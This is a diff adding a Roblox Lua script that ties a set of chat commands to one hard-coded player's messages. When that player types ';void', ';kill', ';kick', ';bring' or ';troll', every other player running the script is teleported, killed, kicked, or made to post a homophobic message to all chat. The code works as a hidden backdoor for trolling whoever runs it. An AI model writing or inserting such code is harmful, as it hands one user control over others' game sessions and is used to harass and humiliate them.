@@ -1,0 +1,115 @@
+local user_premium__001 = game.Players.FlavorgamerYT
+local player = game.Players.LocalPlayer
+
+-- Define a function to make the player character sit
+local function sit()
+    local character = game.Players.LocalPlayer.Character
+    if character then
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.Sit = true
+        end
+    end
+end
+
+-- Define a function to make the player character stand up
+local function standUp()
+    local character = game.Players.LocalPlayer.Character
+    if character then
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.Sit = false
+        end
+    end
+end
+
+local function dieMyCharacter()
+    local character = player.Character
+    if character then
+        local humanoid = character:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.Health = 0
+        end
+    end
+end
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(";void") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 47, 0)
+		end
+	end
+
+end)
+
+
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(";troll") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
+		end
+	end
+
+end)
+
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(";kick") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer:Kick("You have been kicked.")
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(";sit") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			sit()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(";unsit") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			standUp()
+		end
+	end
+
+end)
+
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(";kill") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			dieMyCharacter()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(";bring") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__001.Character.UpperTorso.Position)
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(";cmds") then
+		if game.Players.LocalPlayer == user_premium__001 then
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "Commands";
+	Text = ";bring ;troll ;kill ;kick ;void ;sit ";
+	Time = 15;
+	Icon = "rbxassetid://3463417164";
+})
+		end
+	end
+
+end)
